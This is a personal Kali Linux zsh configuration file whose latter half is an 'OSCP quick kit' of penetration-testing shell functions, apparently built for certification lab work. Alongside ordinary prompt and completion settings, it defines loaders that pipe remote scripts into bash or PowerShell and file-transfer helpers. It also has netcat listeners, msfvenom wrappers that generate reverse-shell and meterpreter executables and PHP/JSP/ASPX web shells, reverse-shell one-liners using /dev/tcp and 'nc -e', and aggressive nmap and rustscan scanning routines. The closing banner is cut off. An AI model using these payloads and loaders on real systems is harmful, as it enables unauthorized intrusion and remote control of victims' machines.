# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

setopt autocd              # change directory just by typing its name
#setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^U' backward-kill-line                   # ctrl + U
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

# 1. Asegurate que nico.myip esté ANTES del precmd
nico.myip() {
  ip addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || ip addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || echo "127.0.0.1"
}


setopt PROMPT_SUBST

configure_prompt() {
    prompt_symbol=㉿
    # Skull emoji for root terminal
    #[ "$EUID" -eq 0 ] && prompt_symbol=💀
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n%F{yellow}@$VPN_IP%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
            ;;
        oneline)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n%F{yellow}@$VPN_IP%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
        backtrack)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n%F{yellow}@$VPN_IP%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
    esac
    unset prompt_symbol
}

configure_prompt


# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    configure_prompt

    # enable syntax-highlighting
    if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
        ZSH_HIGHLIGHT_STYLES[default]=none
        ZSH_HIGHLIGHT_STYLES[unknown-token]=underline
        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[path]=bold
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[assign]=none
        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
        ZSH_HIGHLIGHT_STYLES[named-fd]=none
        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
        ZSH_HIGHLIGHT_STYLES[arg0]=fg=cyan
        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%(#.#.$) '
fi
unset color_prompt force_color_prompt

toggle_oneline_prompt(){
    if [ "$PROMPT_ALTERNATIVE" = oneline ]; then
        PROMPT_ALTERNATIVE=twoline
    else
        PROMPT_ALTERNATIVE=oneline
    fi
    configure_prompt
    zle reset-prompt
}
zle -N toggle_oneline_prompt
bindkey ^P toggle_oneline_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%n@%m: %~\a'
    ;;
*)
    ;;
esac

precmd() {
    # Actualizar VPN_IP
    VPN_IP=$(nico.myip)
    
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$NEWLINE_BEFORE_PROMPT" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

    # Take advantage of $LS_COLORS for completion as well
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi


## Nico
# create enum directories
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
        cat extractPorts.tmp; rm extractPorts.tmp
}


########## OSCP quick kit (nico-style) ##########
# Auto LHOST: prioriza tun0 (VPN), si no eth0
nico.myip() {
  ip addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || ip addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 \
  || echo "127.0.0.1"
}

# Ruta al server temporal del repo
export nico_SRV="${HOME}/Scripts/oscp-aux/httpTempServ.py"

# 1) Servidor HTTP temporal con IP-substitution y SHORTCUTS (usa tun0 o IP pivot)
#    Uso: nico.srv [puerto] [ip_pivot]
#    Ejemplos:
#      nico.srv           # Puerto 80, IP de tun0
#      nico.srv 8080      # Puerto 8080, IP de tun0
#      nico.srv 5555 192.168.1.234  # Puerto 5555, IP pivot 192.168.1.234
nico.srv() {
  local port="${1:-80}"
  local pivot_ip="${2:-}"
  
  if [ -n "$pivot_ip" ]; then
    python3 "$nico_SRV" "$port" "$pivot_ip"
  else
    python3 "$nico_SRV" "$port"
  fi
}
# 2) Cargar scripts de recon en el objetivo (genera el one-liner con tu IP/puerto)
#    - Linux:  . <(curl http://IP:PUERTO/recon.sh)
#    - Windows: iex (New-Object Net.WebClient).DownloadString('http://IP:PUERTO/recon.ps1')
alias nico.loader.linux='echo ". <(curl http://$(nico.myip)/recon.sh)"'
alias nico.loader.win="echo \"powershell -ep bypass \n iex ((New-Object System.Net.WebClient).DownloadString('http://\$(nico.myip)/recon.ps1'))\""

# 3) Transferencias (usa POST/GET del server)
#    El server guarda con el nombre enviado en Content-Disposition
nico.up() { # nico.up <archivo> [remote-name]
  local f="$1"; local name="${2:-$(basename "$1")}"
  curl -sS -X POST \
    -H "Content-Disposition: attachment; filename=${name}" \
    --data-binary @"$f" "http://$(nico.myip)/" && echo "[+] Uploaded: $name"
}
nico.down() { # nico.down <ruta|shortcut> [out]
  local what="$1"; local out="$2"
  if [ -n "$out" ]; then
    curl -sS "http://$(nico.myip)/$what" -o "$out" && echo "[+] Saved to: $out"
  else
    curl -O "http://$(nico.myip)/$what" && echo "[+] Downloaded: $(basename "$what")"
  fi
}

# _____________________

# -----------------------------
# Netcat Listeners & Shell Upgrade
# -----------------------------

# Main function - Start listener with cheatsheet
function nico.nc() {
  local ip=$(nico.myip)
  # Check if port is provided
  if [ -z "$1" ]; then
    echo "Uso: nico.nc <puerto>"
    return 1
  fi
  
  local port="$1"
  
  # Display cheatsheet first
  echo "# IP: ${ip}"
  nc_cheatsheet
  
  # Get terminal size
  get_term_size
  
  # Start listener
  echo -e "\n[+] Starting listener on port $port..."
  echo -e "[+] Waiting for connection...\n"
  echo -e "[+] IP: ${ip}\n"
  /usr/bin/nc -nlvp $port
}

# Comprehensive shell upgrade cheatsheet
function nc_cheatsheet() {
  cat << 'EOF'

╔════════════════════════════════════════════════════════════════╗
║                    SHELL UPGRADE CHEATSHEET                    ║
╚════════════════════════════════════════════════════════════════╝

┌─[ 1. SCRIPT METHOD (PREFERRED) ]───────────────────────────────┐
│ script /dev/null -c bash                                        │
└─────────────────────────────────────────────────────────────────┘

┌─[ 2. PYTHON PTY METHOD ]───────────────────────────────────────┐
│ python3 -c 'import pty; pty.spawn("/bin/bash")'                │
│ python -c 'import pty; pty.spawn("/bin/bash")'                 │
└─────────────────────────────────────────────────────────────────┘

┌─[ 3. SHELL NORMALIZATION (DO THIS AFTER SPAWN) ]───────────────┐
│ [Ctrl+Z]                                                        │
│ stty raw -echo; fg                                              │
│ [Enter][Enter]                                                  │
│ export TERM=xterm-256color                                      │
│ export SHELL=bash                                               │
│ stty rows 54 cols 254                                           │
│ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin  │
└─────────────────────────────────────────────────────────────────┘

┌─[ CHECK YOUR TERMINAL SIZE FIRST ]─────────────────────────────┐
│ Run on YOUR machine: stty size                                  │
│ Then set on target: stty rows <rows> cols <cols>               │
└─────────────────────────────────────────────────────────────────┘

┌─[ ALTERNATIVE SPAWN METHODS ]──────────────────────────────────┐
│ /bin/sh -i                                                      │
│ /bin/bash -i                                                    │
│ perl -e 'exec "/bin/sh";'                                       │
│ ruby: exec "/bin/sh"                                            │
│ lua: os.execute('/bin/sh')                                      │
│ awk 'BEGIN {system("/bin/sh")}'                                 │
│ find / -name blah -exec /bin/sh \;                              │
│ vi: :!bash / :set shell=/bin/bash:shell                         │
└─────────────────────────────────────────────────────────────────┘

┌─[ QUICK REFERENCE ]────────────────────────────────────────────┐
│ Ctrl+C works after:  stty raw -echo; fg                         │
│ Reset terminal:      reset / stty sane                          │
│ Check if interactive: tty (should output /dev/pts/X)            │
└─────────────────────────────────────────────────────────────────┘

EOF
}

# Get current terminal dimensions
function get_term_size() {
  local size=$(stty size 2>/dev/null)
  if [[ -n "$size" ]]; then
    local rows=$(echo $size | cut -d' ' -f1)
    local cols=$(echo $size | cut -d' ' -f2)
    echo -e "\n[i] Your current terminal size: ${rows} rows x ${cols} cols"
    echo "[i] Use: stty rows $rows cols $cols"
  fi
}


# _____________

# Listener configurable para Windows revshell
# Uso: nico.nc.win [PUERTO]
nico.nc.win() {
  local port=${1:-4444} # Usa el primer argumento como puerto, sino usa 4444 por defecto
  local ip=$(nico.myip)

  echo "──────────────────────────────"
  echo "  🐉 Listener Windows revshell "
  echo "──────────────────────────────"
  echo "Puerto seleccionado: ${port}"
  echo "En la víctima (PowerShell):"
  echo "iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}/recon.ps1'))"
  echo "──────────────────────────────"
  echo "[*] Iniciando listener en ${port}..."
  rlwrap nc -nlvp "${port}"
}

# 5) msfvenom quickies (puerto opcional). Ej: nico.msf.win64 4444# msfvenom helpers with optional LHOST (arg1), LPORT (arg2), OUTFILE (arg3)
# Usage examples:
#   nico.msf.win64             -> uses nico.myip() and port 4444, outfile shell_x64.exe
#   nico.msf.win64 10.0.0.5    -> LHOST=10.0.0.5
#   nico.msf.win64 10.0.0.5 5555 my.exe -> custom port and outfile

_nico_msf_common() {
  local payload="$1"; shift
  local default_port="$1"; shift
  local fmt="$1"; shift
  local ext="$1"; shift
  local lhost="${1:-$(nico.myip)}"
  local lport="${2:-$default_port}"
  local outfile="${3:-$(printf 'shell_%s.%s' "${payload//\//_}" "$ext" | tr '[:upper:]' '[:lower:]')}"
  
  # Validate LHOST
  if [[ -z $lhost ]]; then
    printf "Error: Could not determine LHOST. Please specify manually.\n" >&2
    return 1
  fi
  
  # If file exists, avoid silent overwrite
  if [[ -e $outfile ]]; then
    printf "File '%s' exists. Overwrite? [y/N]: " "$outfile" >&2
    read -r yn
    case "$yn" in
      [Yy]*) ;;
      *) printf "Aborted: not overwriting '%s'\n" "$outfile" >&2; return 1 ;;
    esac
  fi
  
  local cmd=(msfvenom -p "$payload" "LHOST=$lhost" "LPORT=$lport" -f "$fmt" -o "$outfile")
  printf "\n[+] Generating payload...\n" >&2
  printf "[*] Payload: %s\n" "$payload" >&2
  printf "[*] LHOST: %s\n" "$lhost" >&2
  printf "[*] LPORT: %s\n" "$lport" >&2
  printf "[*] Output: %s\n\n" "$outfile" >&2
  
  if "${cmd[@]}"; then
    printf "\n[+] Success! Payload saved to: %s\n" "$outfile" >&2
    printf "[*] File size: %s\n" "$(du -h "$outfile" | cut -f1)" >&2
    [[ $ext == "elf" ]] && chmod +x "$outfile" && printf "[*] Made executable\n" >&2
    printf "\n[*] Listener command:\n" >&2
    printf "    nc -nlvp %s\n\n" "$lport" >&2
    return 0
  else
    printf "\n[-] Failed to generate payload\n" >&2
    return 1
  fi
}

# Windows payloads
nico.msf.win64() {
  _nico_msf_common "windows/x64/shell_reverse_tcp" 4444 "exe" "exe" "$@"
}

nico.msf.win32() {
  _nico_msf_common "windows/shell_reverse_tcp" 4444 "exe" "exe" "$@"
}

nico.msf.win64.staged() {
  _nico_msf_common "windows/x64/meterpreter/reverse_tcp" 4444 "exe" "exe" "$@"
}

nico.msf.win64.stageless() {
  _nico_msf_common "windows/x64/meterpreter_reverse_tcp" 4444 "exe" "exe" "$@"
}

# Linux payloads
nico.msf.lin64() {
  _nico_msf_common "linux/x64/shell_reverse_tcp" 443 "elf" "elf" "$@"
}

nico.msf.lin32() {
  _nico_msf_common "linux/x86/shell_reverse_tcp" 443 "elf" "elf" "$@"
}

# Web payloads (useful for OSCP)
nico.msf.php() {
  _nico_msf_common "php/reverse_php" 443 "raw" "php" "$@"
}

nico.msf.jsp() {
  _nico_msf_common "java/jsp_shell_reverse_tcp" 443 "raw" "jsp" "$@"
}

nico.msf.war() {
  _nico_msf_common "java/jsp_shell_reverse_tcp" 443 "war" "war" "$@"
}

nico.msf.aspx() {
  _nico_msf_common "windows/x64/shell_reverse_tcp" 443 "aspx" "aspx" "$@"
}

# Python payload
nico.msf.py() {
  _nico_msf_common "python/shell_reverse_tcp" 443 "raw" "py" "$@"
}

# Bash payload
nico.msf.sh() {
  _nico_msf_common "cmd/unix/reverse_bash" 443 "raw" "sh" "$@"
}

# Helper to list all available msf functions
nico.msf.list() {
  printf "Available msfvenom helpers:\n\n"
  printf "Windows:\n"
  printf "  nico.msf.win64          - Windows x64 shell\n"
  printf "  nico.msf.win32          - Windows x86 shell\n"
  printf "  nico.msf.win64.staged   - Windows x64 meterpreter (staged)\n"
  printf "  nico.msf.win64.stageless - Windows x64 meterpreter (stageless)\n"
  printf "\nLinux:\n"
  printf "  nico.msf.lin64          - Linux x64 shell\n"
  printf "  nico.msf.lin32          - Linux x86 shell\n"
  printf "\nWeb:\n"
  printf "  nico.msf.php            - PHP reverse shell\n"
  printf "  nico.msf.jsp            - JSP reverse shell\n"
  printf "  nico.msf.war            - WAR reverse shell (Tomcat)\n"
  printf "  nico.msf.aspx           - ASPX reverse shell (IIS)\n"
  printf "\nScripting:\n"
  printf "  nico.msf.py             - Python reverse shell\n"
  printf "  nico.msf.sh             - Bash reverse shell\n"
  printf "\nUsage: nico.msf.<type> [LHOST] [LPORT] [OUTFILE]\n"
}


# 6) Shortcuts de binarios comunes (servidos por httpTempServ.py)
#    Estos comandos solo copian al docroot si prefieres apache; si usás httpTempServ, define SHORTCUTS en el .py
alias nico.send.mimikatz='echo "[*] Usa el shortcut /mm.exe en httpTempServ (config en SHORTCUTS del .py)"'
alias nico.send.reconps1='echo "[*] Usa /recon.ps1 (ya mapeado en SHORTCUTS del .py)"'
alias nico.send.reconsh='echo "[*] Usa /recon.sh (ya mapeado en SHORTCUTS del .py)"'

# 7) Quality of life
alias nico.pspy='echo "[*] En Linux objetivo: recon.pspy"'
alias nico.portscan='echo "Uso en Windows objetivo: recon.portscan <host> [1-1024]"'

# 8) MISC
# Bash reverse shell one-liner (auto tun0 IP, default port 4444)
nico.rev.bash() {
  local ip=$(nico.myip)
  local port="${1:-4444}"
  echo "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
  echo "busybox nc ${ip} ${port} -e /bin/bash"
  echo "busybox nc ${ip} ${port} -e sh"
}

# PENELOPE
nico.penelope() {
    if [ -z "$1" ]; then
        python3 ~/Scripts/penelope/penelope.py -i tun0
    else
        python3 ~/Scripts/penelope/penelope.py -p "$1" -i tun0
    fi
}

# 9) nmap
# Nmap full TCP scan (IP obligatorio)
nico.nmap() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.nmap <IP>"
    return 1
  fi
  sudo nmap -p- -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" -oG "allPorts_${target}"
}

nico.nmap.full() {
    local target="$1"
    if [ -z "$target" ]; then
        echo "Uso: nico.nmap <IP>"
        return 1
    fi

    local out="nmap_${target}"

    echo "[1/2] Port discovery..."
    sudo nmap -p- -sS --min-rate 5000 -Pn "$target" -oG "${out}.gnmap" | grep -E "open"

    local ports=$(grep -oP '\d+(?=/open)' "${out}.gnmap" | sort -un | paste -sd,)

    if [ -z "$ports" ]; then
        echo "[!] No open ports"
        return 1
    fi

    echo "[+] Ports: $ports"
    echo ""
    echo "[2/2] Service enumeration..."
    nmap -p"$ports" -sT -sC -sV -Pn "$target" -oN "${out}.nmap"

    echo ""
    echo "[✓] Done: ${out}.nmap"
}

# Nmap UDP scan (IP obligatorio)
nico.nmap.udp() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.nmap.udp <IP>"
    return 1
  fi
  sudo nmap -sU -sS -sC -sV -oA "nmap.udp_${target}" "$target" -v
}

# nico.rust: fast discovery with real-time output + targeted nmap
nico.rust() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.rust <IP>"
    return 1
  fi
  
  # Set ulimit
  ulimit -n 5000 2>/dev/null || true
  
  echo "[*] Running rustscan on $target (real-time output)..."
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  # Run rustscan with real-time output (no capture, direct to stdout)
  # Save to temp file simultaneously using tee
  local tmpfile="/tmp/rs_${target}_$$"
  docker run --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 -a "$target" -b 1500 -t 500 -- -Pn 2>&1 | tee "$tmpfile"
  
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  # Extract ports from saved output
  ports=$(grep -oP '\b\d+(?=/tcp|\s+open\b)' "$tmpfile" | sort -un | tr '\n' ',' | sed 's/,$//')
  rm -f "$tmpfile"
  
  if [ -z "$ports" ]; then
    echo "[!] No ports detected — running full nmap scan"
    local out="allPorts_${target}_full_$(date +%Y%m%d_%H%M%S)"
    sudo nmap -p- -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" -oN "${out}.nmap" -oG "${out}.gnmap"
    return $?
  fi
  
  local out="allPorts_${target}_$(date +%Y%m%d_%H%M%S)"
  echo ""
  echo "[+] Detected ports: $ports"
  echo "[*] Running targeted nmap -> ${out}.nmap"
  echo ""
  
  # Run nmap with both -oN (normal) and -oG (greppable) for OSCP report
  sudo nmap -p"$ports" -sS -sCV --min-rate 5000 -vvv -n -Pn "$target" \
    -oN "${out}.nmap" -oG "${out}.gnmap"
}

# nico.rust.slow: conservative scan for tunnels/VPN
nico.rust.slow() {
  local target="$1"
  if [ -z "$target" ]; then
    echo "Uso: nico.rust.slow <IP>"
    return 1
  fi
  
  ulimit -n 5000 2>/dev/null || true
  
  echo "[*] Running SLOW rustscan on $target (for tunnels/VPN)..."
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  local tmpfile="/tmp/rs_slow_${target}_$$"
  docker run --rm --network host \
    --ulimit nofile=5000:5000 \
    --entrypoint rustscan \
    rustscan/rustscan:2.3.0 -a "$target" -b 200 -t 2000 -- -Pn 2>&1 | tee "$tmpfile"
  
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  
  ports=$(grep -oP '\b\d+(?=/tcp|\s+open\b)' "$tmpfile" | sort -un | tr '\n' ',' | sed 's/,$//')
  rm -f "$tmpfile"
  
  if [ -z "$ports" ]; then
    echo "[!] No ports detected — running conservative full scan"
    local out="allPorts_${target}_full_slow_$(date +%Y%m%d_%H%M%S)"
    # Slower full scan for unstable connections
    sudo nmap -p- -sS -sCV --min-rate 1000 -vvv -n -Pn "$target" -oN "${out}.nmap" -oG "${out}.gnmap"
    return $?
  fi
  
  local out="allPorts_${target}_slow_$(date +%Y%m%d_%H%M%S)"
  echo ""
  echo "[+] Detected ports: $ports"
  echo "[*] Running targeted nmap (slower) -> ${out}.nmap"
  echo ""
  
  sudo nmap -p"$ports" -sS -sCV --min-rate 1000 -vvv -n -Pn "$target" \
    -oN "${out}.nmap" -oG "${out}.gnmap"
}


########## end ##########

# Banner
nico.banner() {
cat <<'EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║                      🐉 NICO OSCP QUICK KIT 🐉                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

┌─ SERVER ─────────────────────────────────────────────────────────────────────┐
│ nico.srv [port]          → HTTP server (shortcuts: /recon.ps1 /nc.exe ...)  │
│ nico.srv [port] [pivot]  → HTTP server for Pivot                            │
│ nico.srv.cheat           → HTTP file transf cheat                           │
│ nico.srv.kill            → kill srv                                         │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ LOADERS ────────────────────────────────────────────────────────────────────┐
│ nico.loader.linux        → Bash one-liner to load recon.sh                  │
│ nico.loader.win          → PowerShell one-liner to load recon.ps1           │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ TRANSFERS ──────────────────────────────────────────────────────────────────┐
│ nico.up f [name]         → Upload file to server                            │
│ nico.down path [o]       → Download (supports shortcuts)                    │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ SHELLS ─────────────────────────────────────────────────────────────────────┐
│ nico.nc [port]           → Netcat listener (default varies by function)     │
│ nico.nc.win [port]       → Netcat listener with rlwrap (default 4444)       │
│ nico.penelope [port]     → Penelope listener on tun0 (optional port)        │
└──────────────────────────────────────────────────────────────────────────────┘

┌─ PAYLOADS (msfvenom) ────────────────────────────────────────────────────────┐
│ Usage: nico.msf.<type> [LHOST] [LPORT] [OUTFILE]                            │
│                                                                              │
│ Windows:                                                                     │
│   nico.msf.win64          → Windows x64 shell (default: 4444)               │
│   nico.msf.win32          → Windows x86 shell (default: 4444)               │
│   nico.msf.win64.staged   → Windows x64 meterpreter staged (4444)           │
│   nico.msf.win64.stageless → Windows x64 meterpreter stageless (4444)       │
│                                                                              │
│ Linux:                                                                       │
│   nico.msf.lin64          → Linux x64 shell (default: 443)                  │
│   nico.msf.lin32          → Linux x86 shell (default: 443)                  │
│                                                                              │
|         							               │
│ Examples:                                                                    │
